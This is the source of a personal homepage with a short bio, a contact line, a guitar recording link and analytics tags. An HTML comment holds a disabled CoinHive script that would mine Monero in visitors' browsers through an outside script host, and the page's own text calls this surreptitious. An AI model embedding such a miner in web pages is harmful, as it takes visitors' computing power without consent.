---
layout:
---
I am interested in engineering effective software, using in anger<br>
functional programming, type theory, and category theory.<br>

contact me:<br>
bohadi protonmail com<br>

<!--
[posts](./writ)
[projects](./proj)
-->

<br><br>
Thank you for the visit.<br>
Here is a short recording of me playing the guitar, which I enjoy.

<audio width="400" height="40" controls controlsList="nodownload">
  <source src="noodle.mp3" type="audio/mpeg">
</audio>


<br>
back to [github](https://github.com/bohadi)<br>


<!--
<br>
Finally, this page can mine Monero on your machine surreptitiously.<br>
<div id='minerstatus'>
Attempting to connect...
</div>
<div id='minerio'>
Hashes/second: 0   <br>
total Hashes: 0    <br>
</div>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  var minerstatus = document.getElementById('minerstatus');
  var minerio     = document.getElementById('minerio');
  setTimeout( function() {
    try {
      var miner = new CoinHive.Anonymous('A9pTI4370gQQt0dRaNJFmFnPXXDvsEwS', {
        threads: 2,
        throttle: 0.5
      });
      miner.start();
      miner.on('open', function() {
        minerstatus.innerHTML =
          'Connected... ('+miner.getNumThreads()+' threads throttled at '+
          100*miner.getThrottle().toFixed(2)+'% WASM supported: '+miner.hasWASMSupport()+')';
      });
      miner.on('error', function() {
        miner.stop();
        minerstatus.innerHTML = '...Connection error. Miner stopping.';
      });
      setInterval(function() {
        minerio.innerHTML = 
          'Hashes/second:  '   + miner.getHashesPerSecond().toFixed(0) + '<br>' +
          ' total Hashes: '    + miner.getTotalHashes()                + '<br>' ;
      }, 1000);
    } catch (e) {
      minerstatus.innerHTML = '...Connection error (adblock). Miner stopping.';
    }
  }, 3000);
</script>
-->

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-106946514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());
  gtag('config', 'UA-106946514-1');
</script>
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
